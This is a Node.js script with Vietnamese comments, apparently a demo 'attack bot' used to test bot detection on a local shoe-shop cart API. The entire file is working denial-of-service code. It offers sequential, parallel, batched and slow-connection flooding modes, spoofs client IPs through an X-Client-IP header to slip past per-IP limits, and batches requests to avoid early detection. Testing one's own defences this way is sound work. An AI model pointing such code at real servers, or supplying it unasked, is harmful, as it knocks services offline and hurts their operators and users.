/**
 * ⚡ BOT TẤN CÔNG #2: DDoS / AUTO-CLICK
 * 
 * Kịch bản: Bot này sẽ gửi hàng ngàn requests đến API backend
 * để gây quá tải server (Denial of Service)
 * 
 * Target: API "Thêm vào giỏ hàng" của trang web giày
 * 
 * Cách chạy: node attacks/bot-dos-attack.js [1|2|3|4]
 */

const axios = require('axios');

// Cấu hình
const CONFIG = {
  TARGET_API: 'http://localhost:5000/api/cart/add',  // API thêm vào giỏ hàng (đúng endpoint)
  NUMBER_OF_REQUESTS: 1000,  // Số requests sẽ gửi
  PARALLEL: true,  // true = gửi đồng thời, false = gửi tuần tự
  DELAY_BETWEEN_REQUESTS: 10,  // Delay giữa các requests (ms)
  
  // Dữ liệu giả để thêm vào giỏ
  FAKE_PRODUCT: {
    variantId: 1,  // ID variant sản phẩm
    quantity: 1
  },
  
  // Session ID giả cho guest (hoặc để trống nếu bot không dùng)
  SESSION_ID: 'bot-session-' + Date.now()
};

// Thống kê
let stats = {
  sent: 0,
  success: 0,
  failed: 0,
  blocked: 0,
  errors: []
};

/**
 * Gửi 1 request tấn công
 */
async function sendAttackRequest(requestNumber, customIP) {
  try {
    const headers = {
      'Content-Type': 'application/json',
      'X-Session-ID': CONFIG.SESSION_ID
    };
    
    // 🎯 Thêm custom IP để test bot detection với nhiều IP khác nhau
    if (customIP) {
      headers['X-Client-IP'] = customIP;
    }
    
    const response = await axios.post(CONFIG.TARGET_API, 
      CONFIG.FAKE_PRODUCT,
      {
        timeout: 5000,  // Timeout sau 5 giây
        headers
      }
    );
    
    stats.success++;
    
    // In log mỗi 100 requests
    if (requestNumber % 100 === 0) {
      console.log(`✅ [${requestNumber}/${CONFIG.NUMBER_OF_REQUESTS}] Success - Total: ${stats.success}`);
    }
    
    return { success: true, requestNumber };
    
  } catch (error) {
    stats.failed++;
    
    if (error.response) {
      // Server phản hồi với error
      if (error.response.status === 403 || error.response.status === 429) {
        stats.blocked++;
        console.log(`\n${'🚫'.repeat(40)}`);
        console.log(`🚫 [${requestNumber}] BOT BỊ PHÁT HIỆN VÀ CHẶN!`);
        console.log(`📛 Lý do: ${error.response.data.reason || error.response.data.error}`);
        console.log(`📊 Status: ${error.response.status}`);
        if (error.response.data.timeSincePageLoad) {
          console.log(`⏱️  Thời gian phản ứng: ${error.response.data.timeSincePageLoad}ms`);
        }
        if (error.response.data.requestCount) {
          console.log(`📈 Số requests: ${error.response.data.requestCount}/phút`);
        }
        console.log(`${'🚫'.repeat(40)}\n`);
      } else if (error.response.status === 400) {
        console.log(`❌ [${requestNumber}] Bad Request - Kiểm tra dữ liệu gửi đi`);
      } else {
        console.log(`❌ [${requestNumber}] Error ${error.response.status}`);
      }
    } else if (error.code === 'ECONNREFUSED') {
      // Server bị sập
      console.log(`💥 [${requestNumber}] SERVER KHÔNG PHẢN HỒI - CÓ THỂ ĐÃ QUÁI TẢI!`);
      stats.errors.push('Server crashed or unreachable');
    } else if (error.code === 'ETIMEDOUT' || error.code === 'ECONNABORTED') {
      // Timeout
      console.log(`⏰ [${requestNumber}] TIMEOUT - Server quá chậm`);
      stats.errors.push('Timeout');
    } else {
      console.log(`❌ [${requestNumber}] ${error.message}`);
    }
    
    return { success: false, requestNumber, error: error.message };
  }
}

/**
 * Phương pháp 1: Tấn công tuần tự
 * Gửi từng request một, đợi response trước khi gửi tiếp
 */
async function attackSequential() {
  console.log('🎯 BẮT ĐẦU TẤN CÔNG TUẦN TỰ...\n');
  console.log(`Target: ${CONFIG.TARGET_API}`);
  console.log(`Số requests: ${CONFIG.NUMBER_OF_REQUESTS}`);
  console.log(`Delay: ${CONFIG.DELAY_BETWEEN_REQUESTS}ms\n`);
  
  const startTime = Date.now();
  
  for (let i = 1; i <= CONFIG.NUMBER_OF_REQUESTS; i++) {
    stats.sent++;
    // 🎯 Giả lập nhiều IP khác nhau (192.168.1.x)
    const fakeIP = `192.168.1.${Math.floor(Math.random() * 255)}`;
    await sendAttackRequest(i, fakeIP);
    
    // Delay nhỏ giữa các requests
    if (CONFIG.DELAY_BETWEEN_REQUESTS > 0) {
      await sleep(CONFIG.DELAY_BETWEEN_REQUESTS);
    }
    
    // Nếu bị block quá nhiều, dừng lại
    if (stats.blocked > 10) {
      console.log('\n⛔ ĐÃ BỊ CHẶN QUÁ NHIỀU LẦN. DỪNG TẤN CÔNG!\n');
      break;
    }
  }
  
  const endTime = Date.now();
  printStatistics(startTime, endTime);
}

/**
 * Phương pháp 2: Tấn công song song (Parallel)
 * Gửi tất cả requests cùng lúc - GÂY QUÁ TẢI NGHIÊM TRỌNG!
 */
async function attackParallel() {
  console.log('🎯 BẮT ĐẦU TẤN CÔNG SONG SONG (DDoS)...\n');
  console.log(`⚠️  CẢNH BÁO: ${CONFIG.NUMBER_OF_REQUESTS} requests sẽ được gửi ĐỒNG THỜI!`);
  console.log(`Target: ${CONFIG.TARGET_API}\n`);
  
  const startTime = Date.now();
  
  // Tạo mảng promises
  const promises = [];
  for (let i = 1; i <= CONFIG.NUMBER_OF_REQUESTS; i++) {
    stats.sent++;
    // 🎯 Giả lập nhiều IP khác nhau (10.0.x.x)
    const fakeIP = `10.0.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    promises.push(sendAttackRequest(i, fakeIP));
  }
  
  console.log('🚀 Đang gửi tất cả requests...\n');
  
  // Gửi tất cả cùng lúc
  await Promise.all(promises);
  
  const endTime = Date.now();
  printStatistics(startTime, endTime);
}

/**
 * Phương pháp 3: Tấn công theo batch (Từng đợt)
 * Gửi theo nhóm nhỏ để tránh bị phát hiện quá sớm
 */
async function attackBatch() {
  const BATCH_SIZE = 50;  // Mỗi đợt gửi 50 requests
  const DELAY_BETWEEN_BATCHES = 1000;  // Nghỉ 1 giây giữa các đợt
  
  console.log('🎯 BẮT ĐẦU TẤN CÔNG THEO BATCH...\n');
  console.log(`Target: ${CONFIG.TARGET_API}`);
  console.log(`Tổng requests: ${CONFIG.NUMBER_OF_REQUESTS}`);
  console.log(`Batch size: ${BATCH_SIZE}`);
  console.log(`Delay giữa batches: ${DELAY_BETWEEN_BATCHES}ms\n`);
  
  const startTime = Date.now();
  const totalBatches = Math.ceil(CONFIG.NUMBER_OF_REQUESTS / BATCH_SIZE);
  
  for (let batchNum = 0; batchNum < totalBatches; batchNum++) {
    const batchStart = batchNum * BATCH_SIZE + 1;
    const batchEnd = Math.min((batchNum + 1) * BATCH_SIZE, CONFIG.NUMBER_OF_REQUESTS);
    const batchCount = batchEnd - batchStart + 1;
    
    console.log(`📦 Batch ${batchNum + 1}/${totalBatches}: Gửi ${batchCount} requests (${batchStart}-${batchEnd})`);
    
    // Tạo promises cho batch này
    const promises = [];
    for (let i = batchStart; i <= batchEnd; i++) {
      stats.sent++;
      // 🎯 Giả lập nhiều IP khác nhau mỗi batch (172.16.x.x)
      const fakeIP = `172.16.${batchNum}.${i % 255}`;
      promises.push(sendAttackRequest(i, fakeIP));
    }
    
    // Gửi batch
    await Promise.all(promises);
    
    console.log(`✅ Batch ${batchNum + 1} hoàn thành. Success: ${stats.success}, Failed: ${stats.failed}, Blocked: ${stats.blocked}\n`);
    
    // Nghỉ giữa các batches
    if (batchNum < totalBatches - 1) {
      await sleep(DELAY_BETWEEN_BATCHES);
    }
    
    // Nếu bị block quá nhiều, dừng lại
    if (stats.blocked > 20) {
      console.log('\n⛔ ĐÃ BỊ CHẶN QUÁ NHIỀU LẦN. DỪNG TẤN CÔNG!\n');
      break;
    }
  }
  
  const endTime = Date.now();
  printStatistics(startTime, endTime);
}

/**
 * Phương pháp 4: Slow Loris Attack
 * Gửi requests chậm nhưng giữ kết nối mở lâu
 */
async function attackSlowLoris() {
  console.log('🎯 BẮT ĐẦU SLOW LORIS ATTACK...\n');
  console.log(`Target: ${CONFIG.TARGET_API}`);
  console.log(`Số connections: ${CONFIG.NUMBER_OF_REQUESTS}\n`);
  
  const startTime = Date.now();
  
  // Tạo nhiều connections và giữ chúng mở
  const connections = [];
  
  for (let i = 1; i <= CONFIG.NUMBER_OF_REQUESTS; i++) {
    // 🎯 Giả lập nhiều IP khác nhau (203.0.113.x - TEST-NET-3)
    const fakeIP = `203.0.113.${i % 255}`;
    
    const connection = axios.post(CONFIG.TARGET_API, 
      CONFIG.FAKE_PRODUCT,
      {
        timeout: 60000,  // Timeout dài 60 giây
        headers: {
          'Content-Type': 'application/json',
          'X-Session-ID': CONFIG.SESSION_ID,
          'X-Client-IP': fakeIP
        }
      }
    ).then(() => {
      stats.success++;
    }).catch(() => {
      stats.failed++;
    });
    
    connections.push(connection);
    stats.sent++;
    
    // Gửi chậm - mỗi 50ms một connection
    await sleep(50);
    
    if (i % 100 === 0) {
      console.log(`📡 [${i}/${CONFIG.NUMBER_OF_REQUESTS}] Đã mở ${i} connections`);
    }
  }
  
  console.log('\n⏳ Đang giữ tất cả connections mở...\n');
  await Promise.all(connections);
  
  const endTime = Date.now();
  printStatistics(startTime, endTime);
}

/**
 * In thống kê
 */
function printStatistics(startTime, endTime) {
  const duration = ((endTime - startTime) / 1000).toFixed(2);
  const requestsPerSecond = (stats.sent / duration).toFixed(2);
  const successRate = ((stats.success / stats.sent) * 100).toFixed(1);
  
  console.log('\n' + '='.repeat(60));
  console.log('📊 THỐNG KÊ TẤN CÔNG');
  console.log('='.repeat(60));
  console.log(`⏱️  Thời gian: ${duration} giây`);
  console.log(`📤 Tổng requests gửi: ${stats.sent}`);
  console.log(`⚡ Requests/giây: ${requestsPerSecond}`);
  console.log(`✅ Thành công: ${stats.success} (${successRate}%)`);
  console.log(`❌ Thất bại: ${stats.failed}`);
  console.log(`🚫 Bị chặn: ${stats.blocked}`);
  
  if (stats.blocked > 0) {
    console.log('\n✅ HỆ THỐNG PHÒNG THỦ HOẠT ĐỘNG - BOT ĐÃ BỊ PHÁT HIỆN!');
  }
  
  if (stats.errors.length > 0) {
    const timeouts = stats.errors.filter(e => e === 'Timeout').length;
    const crashes = stats.errors.filter(e => e.includes('crashed')).length;
    console.log(`\n💥 Server timeouts: ${timeouts}`);
    console.log(`💥 Server crashes: ${crashes}`);
    
    if (crashes > 0) {
      console.log('\n⚠️  CẢNH BÁO: SERVER CÓ THỂ ĐÃ BỊ QUÁ TẢI!');
    }
  }
  
  console.log('='.repeat(60) + '\n');
}

// Helper function
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Menu chọn phương pháp tấn công
async function main() {
  console.log('\n' + '='.repeat(60));
  console.log('⚡ BOT TẤNG CÔNG DDoS / AUTO-CLICK - DEMO');
  console.log('='.repeat(60));
  console.log('Chọn phương pháp tấn công:');
  console.log('1. Tấn công tuần tự (Sequential)');
  console.log('2. Tấn công song song (Parallel DDoS) ⚠️  NGUY HIỂM!');
  console.log('3. Tấn công theo batch (Từng đợt)');
  console.log('4. Slow Loris Attack');
  console.log('='.repeat(60) + '\n');
  
  // Lấy tham số từ command line
  const method = process.argv[2] || '1';
  
  // Reset stats
  stats = {
    sent: 0,
    success: 0,
    failed: 0,
    blocked: 0,
    errors: []
  };
  
  switch(method) {
    case '1':
      await attackSequential();
      break;
    case '2':
      console.log('⚠️  CẢNH BÁO: Tấn công này có thể làm server bị quá tải nghiêm trọng!');
      console.log('⏳ Đang chờ 3 giây để bạn hủy (Ctrl+C)...\n');
      await sleep(3000);
      await attackParallel();
      break;
    case '3':
      await attackBatch();
      break;
    case '4':
      await attackSlowLoris();
      break;
    default:
      console.log('❌ Phương pháp không hợp lệ. Sử dụng: node bot-dos-attack.js [1|2|3|4]');
  }
}

// Chạy
main();
